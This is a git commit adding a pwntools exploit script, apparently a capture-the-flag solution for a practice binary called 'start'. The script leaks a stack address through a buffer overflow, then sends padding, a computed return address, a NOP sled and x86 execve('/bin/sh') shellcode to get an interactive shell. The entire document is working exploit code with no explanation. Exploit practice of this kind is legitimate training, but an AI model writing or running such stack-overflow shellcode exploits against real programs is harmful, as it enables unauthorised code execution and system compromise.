39072b48597bb66cd7572822f9aa8d67b98fb92e
hox <zenhox>
2019-04-29 11:19:11 +0800

    pwnable:start

--- pwnable/start.py
+++ pwnable/start.py
@@ -1,2 +1,30 @@
 #!/usr/bin/python
-from pwn import 
+from pwn import *
+
+context.log_level = 'debug'
+p = process('./start')
+
+def getLeaf():
+    p.recv()
+    padding1 = 20 * 'a'
+    gad = 0x08048087
+    payload = padding1 + p32(gad)
+    p.send(payload)
+    leav = u32(p.recv(4))
+    p.recv()
+    return leav
+
+padding1 = 20*'a'
+gad = p32(getLeaf() + 20) 
+shellcode = asm('\n'.join([
+    'push %d' % u32('/sh\0'),
+    'push %d' % u32('/bin'),
+    'xor edx, edx',
+    'xor ecx, ecx',
+    'mov ebx, esp',
+    'mov eax, 0xb',
+    'int 0x80',
+]))
+payload = padding1 + gad + '\x90' * 5+ shellcode
+p.send(payload)
+p.interactive()
